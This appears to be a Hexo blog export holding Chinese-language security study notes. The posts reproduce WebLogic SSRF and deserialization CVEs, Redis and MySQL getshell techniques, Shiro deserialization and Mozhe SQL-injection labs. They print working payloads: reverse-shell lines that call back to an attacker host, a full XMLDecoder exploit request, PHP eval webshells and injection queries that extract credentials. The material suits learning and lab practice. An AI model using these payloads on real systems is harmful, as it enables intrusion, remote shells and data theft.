{"meta":{"title":"redfish的学习笔记","subtitle":"redfish的学习笔记","description":"","author":"John Doe","url":"https://REDREDREDFISH.github.io","root":"/"},"pages":[{"title":"分类","date":"2021-12-02T08:13:30.951Z","updated":"2021-12-02T08:13:30.951Z","comments":false,"path":"categories/index.html","permalink":"https://redredredfish.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-12-02T14:03:06.936Z","updated":"2021-12-02T14:03:06.936Z","comments":true,"path":"repository/index.html","permalink":"https://redredredfish.github.io/repository/index.html","excerpt":"","text":"Githubgithub: username: REDREDREDFISH # github username"},{"title":"标签","date":"2021-12-02T09:44:47.223Z","updated":"2021-12-02T08:13:30.956Z","comments":false,"path":"tags/index.html","permalink":"https://redredredfish.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-12-02T15:48:58.244Z","updated":"2021-12-02T08:13:30.952Z","comments":true,"path":"links/index.html","permalink":"https://redredredfish.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"vulhub weblogic ssrf复现","slug":"vulhub-weblogic-ssrf复现","date":"2021-11-19T18:05:00.000Z","updated":"2021-12-21T18:16:21.034Z","comments":true,"path":"2021/11/20/vulhub-weblogic-ssrf复现/","link":"","permalink":"https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"VPS:x.x.x.x 跳板机debian：192.168.130.129 weblogic 内网ubuntu：192.168.130.132 redis 1、operator参数可以调用外部url，由于未做限制，造成ssrf，可以借助它探测服务器端口，如下两种不同的报错 http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389 2、通过ssrf探测内网主机，发现内网主机192.168.130.132开启6379且存在redis未授权，可以通过http的get请求写入shell 为什么get请求能写shell 1、redis未授权 2、redis通过换行符(\\r\\n)来分隔命令 3、目标主机开启定时任务 3、VPS监听6666端口 root@iZbp1h497hkijddeblcm8jZ:~# nc -lvp 6666 Listening on [0.0.0.0] (family 0, port 6666) 4、get写定时任务 shell /etc/crontab set 1 &quot;\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/VPS:ip/6666 0&gt;&amp;1&#39;\\n\\n\\n\\n&quot; config set dir /etc/ config set dbfilename crontab save 命令之间用\\r\\n分隔，url编码%0D%0A，全部url编码 set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.97.50.242%2F6666%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A 5、传参，反弹shell 遇到的坑 1.定时任务不一定会执行 2.不同系统定时任务目录不一样 /etc/crontab #大部分linux /etc/cron.d/ #ubuntu /var/spool/cron/root #centOS /var/spool/cron/crontabs/root #debian 3.不太理解README里的shell最后为啥要加个aaa","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ssrf","slug":"web漏洞/ssrf","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://redredredfish.github.io/tags/ssrf/"}],"author":"redfish"},{"title":"weblogic反序列化漏洞的初级理解(二)","slug":"weblogic反序列化漏洞的初级理解-二","date":"2021-07-08T07:18:00.000Z","updated":"2021-12-06T07:19:19.216Z","comments":true,"path":"2021/07/08/weblogic反序列化漏洞的初级理解-二/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/","excerpt":"","text":"前言接着上篇，这次复现经典的weblogic反序列化漏洞—CVE-2018-2628属于利用T3协议配合RMP接口反向发送反序列化数据。同样先利用vulhub快速复现，然后再来看看原理。 漏洞复现CVE-2018-2628 影响范围：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3 docker开启环境 1root@kali:/vulhub/weblogic/CVE-2018-2628# docker-compose up -d 浏览器访问localhost:7001/console，出现weblogic的登录界面，说明环境已经搭好了 (╹ڡ╹ )vulhub yyds!可以看到weblogic的版本是10.3.6.0利用ysoserial启动一个JRMP Server服务监听这里插一句编译ysoserial注意JDK版本不要过高，建议在1.7u21以下，卡了好久┗|｀O′|┛ 开启监听，命令执行这里老办法，尝试新建一个shell文件，比较直观 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 &quot;touch /tmp/shell&quot; 使用vulhub提供的exp脚本，为了方便，保存在ysoserial-0.0.6-SNAPSHOT-all.jar同目录下执行exp 1python CVE-2018-2628exp.py [开启weblogic的IP] [端口] ysoserial-0.0.6-SNAPSHOT-all.jar [开启JRMP Server的IP] [监听端口] JRMPClient exp开始跑，监听成功 exp跑完，进入docker容器查看文件是否创建成功 1root@kali:/vulhub/weblogic/CVE-2018-2628# docker-compose exec weblogic bash 复现完成 漏洞原理看一下官方的漏洞简介 Oracle WebLogic Server是美国甲骨文（Oracle）公司的一款适用于云环境和传统环境的应用服务器，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。WLS Core是其中的一个核心组件。 Oracle WebLogic Server中的WLS核心组件存在远程代码执行漏洞。攻击者可通过远程发送攻击数据，借助T3协议在WebLogic Server中执行反序列化操作利用该漏洞执行代码。 首先需要搞懂啥是T3协议 T3协议：WebLogic Server 中的 RMI(远程方法调用)通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。JRMP Server服务：java远程消息交换协议 利用nmap快速检测T3协议是否开放 1nmap -sV IP --script=weblogic-t3-info.nse -p 7001 大致流程 结合exp来看主函数很短，接收JRMP参数，执行exploit函数exploit中，看名字t3_handshake和build_t3_request_object应该是建立T3连接，generate_payload应该是序列化数据,send_payload_objdata自然就是发送数据包了发送T3协议头数据包构造序列化数据包并发送 修复建议打补丁对T3协议进行访问控制 参考https://www.cnblogs.com/afanti/p/10256840.htmlhttps://blog.csdn.net/u014715599/article/details/85256193","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"weblogic反序列化漏洞的初级理解(一)","slug":"weblogic反序列化漏洞的初级理解-一","date":"2021-07-08T03:07:00.000Z","updated":"2021-12-06T03:09:51.923Z","comments":true,"path":"2021/07/08/weblogic反序列化漏洞的初级理解-一/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/","excerpt":"","text":"啥是weblogic WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件大概可以理解为tomcat pro max🙃 Weblogic反序列化漏洞的几个利用阶段从利用方式来看,分为三类 1.直接通过T3协议发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)2.利用T3协议配合RMP或ND接口反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用IIOP协议的CVE-2020-25513.通过 javabean XML方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729) 漏洞复现由于漏洞众多，搭建环境比较复杂，还是先利用vulhub中的CVE-2017-10271、CVE-2018-2628、CVE-2018-2894、CVE-2020-14882几个标志性的漏洞环境进行复现。 先从最古老的开始 CVE-2017-10271 影响范围：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0 docker开启环境 1root@kali:/vulhub/weblogic/CVE-2017-10271# docker-compose up -d 远古版本，环境好大先忍一下 等待的过程中先理解一下漏洞原理以及vulhub给出的poc 该漏洞主要针对weblogic的WLS-WebServices组件属于上述反序列化漏洞利用的第三类大致的原理通过传输javabean XML方式构造恶意XML数据造成代码执行 结合poc来看 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot; /&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body /&gt;&lt;/soapenv:Envelope&gt; 大概是向网站的/wls-wsat/CoordinatorPortType路径传入xml数据，这串xml目的是反弹shellOK，环境起好开始复现 访问localhost:7001/wls-wsat/CoordinatorPortType，显示wls-wsat组件的一些配置信息，表示服务已经开启本地监听6666端口 1root@kali:/# nc -l -p 6666 bp抓包重放构造好的数据包，注意字段Content-Type改为text/xml成功反弹shell，服务器执行了我们传入的/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 漏洞原理漏洞利用的过程很简单有两个疑问点 1.wls-wsat组件如何处理xml数据2.造成反序列化漏洞的关键点在哪 尝试传入任意命令在响应中看到了返回的xml数据以及整个处理过程的调用栈可以看到处理过程最后调用了java.beans.XMLDecoder方法，该方法用于将XML数据反序列化为java对象，这里造成了无回显的命令执行 根据vulhub提供的技术文档、参考大佬的分析过程可以得知大致的处理过程 1.根据POC，当我们传入&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;标签包裹的数据时，wls-wsat使用了weblogic自带的webservices处理程序来处理SOAP请求2.该处理程序首先调用weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法获取到我们传入的xml数据为var1，定义var2为处理过的var1数据3.通过var2.get()方法中的WorkAreaConstants.WORK_AREA_HEADER参数获取&lt;work:WorkContext &gt;标签中的内容4.当var3不为空时，执行readHeaderOld(var3); 5.在readHeaderOld中，实例化了WorkContextXmlInputAdapter，此时方法内的var4是java标签里的内容 6.在实例化WorkContextXmlInputAdapter中，直接调用xmlDecoder反序列化传入的xml数据，也就是处理过的var4 从整个过程中可以发现，传入的xml数据从始至终都没有受到任何过滤，wls-wsat的类似剥洋葱的处理方式一层一层揭开最后直接反序列化，这样显然是很不安全滴。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"redis未授权访问","slug":"helloworld","date":"2021-07-07T08:05:00.000Z","updated":"2021-12-06T03:10:31.762Z","comments":true,"path":"2021/07/07/helloworld/","link":"","permalink":"https://redredredfish.github.io/2021/07/07/helloworld/","excerpt":"","text":"redis未授权访问的利用方式漏洞原理： Redis&lt;3.2默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的安全策略，比如添加防火墙黑白名单等等，这样会将Redis服务暴露在公网上。如果在没有设置密码(默认为空)的情况下，会导致任意用户可以未授权访问Redis以及读取Redis的数据。攻击者利用Redis自身的提供的config命令，可以进行写文件操作，还可以将ssh公钥写入目标服务器./root/.ssh下的authotrized_keys 文件中，进而可以利用对应私钥直接使用ssh服务器登录目标服务器。漏洞的产生条件有以下两点: Redis绑定在0.0.0.0:6379,且没有进行添加安全策略，直接暴露在公网 没有设置密码认证或者弱密码，可以免密登录redis服务 漏洞复现：环境： 攻击机kali5.7.0 192.168.237.132 靶机1 Ubuntu16.04 192.168.237.128 靶机2 centOS7 192.168.237.133 redis 2.8.17 靶机1开启redis-server，攻击机./redis-cli -h 尝试连接由于靶机1没有开启安全策略且默认没有设置密码认证造成攻击机可以未授权访问且执行命令获取敏感数据 利用方式一：webshell攻击机进行未授权访问，利用redis的config set命令将webshell写入靶机2网站目录下(*Redis Config Set 命令可以动态地调整 Redis 服务器的配置) 1234config set dir #设置路径config set dbfilename #设置文件名set webshell #写入key值“webshell”对应的值save #将所有key值保存在文件中 在靶机2上查看已经写入了shell.php文件 浏览器访问http://靶机2/shell.php,发现成功写入webshell 同理可写入一句话木马\\n\\n\\n换行避免因&lt;?导致shell无法解析 菜刀成功连接 利用方式二：写入SSH公钥实现SSH登录将攻击机本机的公钥作为value，然后通过修改redis的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在靶机2的/root/.ssh下生一个授权的key，从而通过ssh登录靶机2。 1ssh-keygen -t rsa #生成ssh公钥和私钥,默认密码为空 将生成的公钥保存到ssh.txt 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ssh.txt 将保存的公钥ssh.txt写入靶机2 redis的key值ssh中 1cat /root/.ssh/ssh.txt | redis-cli -h 靶机2 -x set ssh 远程登录靶机2的redis服务，更改redis备份路径为ssh公钥存放目录 1config set dir /root/.ssh 设置上传公钥的备份文件名字为authorized_keys,保存上传攻击机使用ssh免密登录靶机2 成功登录靶机2 利用方式三：crontab定时任务，反弹shell攻击机监听9999端口 1nc -l 端口 远程登录redis，写入定时任务，一分钟后执行bash反弹shell 1234set test &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机/监听端口 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename testsave 反弹shell成功 利用方式四：执行lua脚本Redis在2.6推出了脚本功能，允许开发者使用lua语言编写脚本传到Redis中执行。暂时还没找到怎么利用lua执行系统命令。 编写lua脚本test.lua输出字符hello,world! 12local a = &quot;hello,world!&quot;return a redis-cli –eval test.lua -h 靶机2","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"未授权访问漏洞","slug":"web漏洞/未授权访问漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"redis未授权访问","slug":"redis未授权访问","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"Mysql写shell的几种方式","slug":"Mysql写shell的几种方式","date":"2021-07-06T03:04:00.000Z","updated":"2021-12-08T08:19:13.390Z","comments":true,"path":"2021/07/06/Mysql写shell的几种方式/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"Mysql写shell的几种方式当我们拿到数据库权限时，可通过数据库管理工具写入shell到目标服务器上，利用shell控制目标服务器。 复现环境：phpstudy_pro 8.1.0.6mysql 5.7.26 root权限 网站绝对路径为D:\\phpstudy_pro\\WWW 利用方式： 通过outfile写入shell尝试通过outfile写入文件 1报错[Code: 1290, SQL State: HY000]The MySQL server is running with the –secure-file-priv option so it cannot execute this statement 百度之后找到原因：mysql 5.6.34版本以后 secure_file_priv的值默认为NULL，限制无法导入和导出文件 解决办法：在my.ini配置文件[mysqld]下添加secure_file_priv =&quot;&quot;使其默认为空 新建查询select 12&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;;，成功写入shell.php文件 蚁剑连接http://localhost:122/shell.php成功 向表插入shell并查询导出将一句话木马作为数据插入test1表username字段中 1insert into`test1`(`username`) values (&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;); 查询该数据并导出到shell.php 1select username from test1 into outfile &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 蚁剑连接http://localhost:122/shell.php成功 开启全局日志写入shell首先查看全局日志是否开启 1show variables like &#x27;%general%&#x27;; 如图所示general_log=OFF全局日志未开启 1234开启全局日志 set global general_log = on; 将全局日志路径设置为shell文件路径 set global general_log_file = &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 1新建查询select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;; mysql会将执行的语句记录到全局日志，从而将shell写入网站目录 蚁剑连接成功 慢查询日志写入shell由于在mysql&gt;5.6.34中，secure_file_priv会阻拦我们使用outfile写入文件，没有服务器权限无法修改my.ini配置文件，可以利用慢查询日志写入shell，原理和利用全局日志差不多。首先一样查看慢查询日志是否开启 1show variables like &#x27;%slow_query_log%&#x27;; 开启慢查询日志并修改日志文件的绝对路径 使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中 1查询mysql系统时间 show global variables like &#x27;%long_query_time%&#x27;; 向日志中写入shell 1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);设置查询时间为11s 执行成功 蚁剑连接成功 phpMyAdmin文件包含漏洞CVE-2018-19968CVE-2018-12613CVE-2016-5734CVE-2014-8959","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"web漏洞/sql注入/mysql注入/getshell","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"getshell","permalink":"https://redredredfish.github.io/tags/getshell/"}],"author":"redfish"},{"title":"shiro反序列化的初级理解","slug":"shiro反序列化","date":"2021-07-06T02:37:00.000Z","updated":"2021-12-06T03:09:26.034Z","comments":true,"path":"2021/07/06/shiro反序列化/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"shiro反序列化原理rememberMe功能：shiro框架提供了rememberMe功能，这个功能大概是用户登录成功后会生成一个凭证组，shiro将它经过序列化-&gt;AES加密-&gt;Base64加密得到一串数据流传回给cookie，下次登录时，shiro通过Base64解码-&gt;AES解密-&gt;反序列化验证cookie中的rememberMe包含的凭证组是否正确，从而实现“下次登录记住我”的功能。 漏洞原理：造成shiro反序列化漏洞的关键点，一个是Shiro&lt;1.2.4中，AES-CBC加解密时key默认为硬编码，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据；另一个点是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。 漏洞利用： 首先需要获取正确的key值，利用shiro接收错误rememberMe会抛出异常返回Set-Cookie的特性，可以通过爆破，直到响应头中不包含Set-Cookie，说明key成功匹配。 接着需要对恶意数据进行序列化，shiro序列化对象只有继承PrincipalCollection时，类型转换才正常，不然会抛出异常，这里可以借助ysoserial生成序列化数据：利用ysoserial中的JRMP监听模块进行反弹shell，需使用Java Runtime 配合 bash 编码 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 监听端口CommonsCollections4 ‘bash编码’ 利用ysoserial生成.ser文件 java -jarysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 “命令” &gt; x.ser 然后进行AES加密、Base64加密，伪造cookie，执行命令 如何判断一个网站是否使用了shiro框架在请求包中的cookie字段添加rememberMe=xxx,查看响应头中是否包含rememberMe=deleteMe值例如：","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"shiro反序列化","slug":"shiro反序列化","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"墨者-SQL注入漏洞测试(报错盲注) 题解","slug":"墨者-SQL注入漏洞测试-报错盲注-题解","date":"2021-06-21T08:20:00.000Z","updated":"2021-12-08T08:26:44.798Z","comments":true,"path":"2021/06/21/墨者-SQL注入漏洞测试-报错盲注-题解/","link":"","permalink":"https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/","excerpt":"","text":"靶场地址：https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe 依旧是mysql、无防护 ①依旧是公告界面 url:http://219.153.49.228:44679/new_list.php?id=1 1&#39;,1&#39; and &#39;1&#39;=&#39;1&#39; -- q,1&#39; and &#39;1&#39;=&#39;2&#39; -- q判断存在字符型注入 数据库类型为MariaDB ②order by 判断字段数为4，union select无回显 ③尝试报错注入，利用函数updatexml() updatexml参数(目标xml内容,xml文档路径,更新的内容) 当文档路径包含字符~,会判断不合法，输出字符~报错 利用concat函数将子查询语句与字符~拼接 例如：concat(0x7e,(select user())) 会将查询结果拼接~报错输出 所以尝试 id=1&#39; and updatexml(1,concat(0x7e,(select user())),1) -- q判断存在报错注入 ④接下来还是联合注入那一套，替换子查询语句即可 id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),1) -- q 爆出库名information_schema,mysql,perfor 查询perfor库是空的 database()查询出当前数据库为stormgroup，居然不在schema_name里 爆出表名member,notice 表member爆出字段name,password,status ⑤分别查询字段值 id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(字段) from member)),1) -- q name字段：mozhe,mozhe status字段：0,1 查询password字段时，根据另外两个字段可知有两条数据，因为报错长度最多为32位，字符~占了1位，剩下31位不够输出第一个32位的MD5密码，而且第一条数据status字段值为0，大概率用不了。 直接查询第二条数据 id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from member where status=&#39;1&#39;)),1) -- q得到~76e59b744c5db295a5f0b66f2e9a192 依旧少了一位，利用函数substr(字符串，32，1)输出第32位字符 id=11111111&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),32,1) from member where status=1)),1) -- q 得到~e 拼一拼得到76e59b744c5db295a5f0b66f2e9a192e 解密得到945748 mozhe/945748登录得到key","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"web漏洞/sql注入/mysql注入/靶场","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"}],"author":"redfish"},{"title":"墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解","slug":"墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解","date":"2021-06-20T08:14:00.000Z","updated":"2021-12-08T08:26:34.683Z","comments":true,"path":"2021/06/20/墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解/","link":"","permalink":"https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/","excerpt":"","text":"靶场地址：https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe 题解：①启动靶场 url：http://219.153.49.228:43157/ 是一个登录界面，显然需要登录获得key，一开始使用万能密码、抓包都没找到注入点，结果在这个滚动的公告页面 url:http://219.153.49.228:43157/new_list.php?id=tingjigonggao ②进入页面，url中有id=tingjigonggao，显示是get的字符型参数 试一下id=tingjigonggao&#39;，报错 试一下id=tingjigonggao&#39; and &#39;1&#39;=&#39;1&#39; -- q,页面正常 试一下id=tingjigonggao&#39; and &#39;1&#39;=&#39;2&#39; -- q,页面不正常 判断存在字符型注入。 ③判断字段数 id=aaa&#39; order by 5 -- q，报错 id=aaa&#39; order by 4 -- q，没数据，正常 判断字段数为4。 ④判断回显点 id=aaa&#39; union select 1,2,3,4 -- q2,3参数处回显。 ⑤参数替换version()查看版本 id=aaa&#39; union select 1,2,version(),4 -- qMariaDB-10.2.15&gt;mysql5.0,放心用information_schema库。 ⑥查询所有库名 id=aaa&#39; union select 1,2,group_concat(schema_name),4 from information_schema.schemata -- q获得库名information_schema,mozhe_discuz_stormgroup,mysql,performance_schema,test ⑦查询mozhe_discuz_stormgroup库中的表id=aaa&#39; union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=&#39;mozhe_discuz_stormgroup&#39; -- q获得表名notice,stormgroup_member⑧查询stormgroup_member表中字段名id=aaa&#39; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=&#39;stormgroup_member&#39; -- 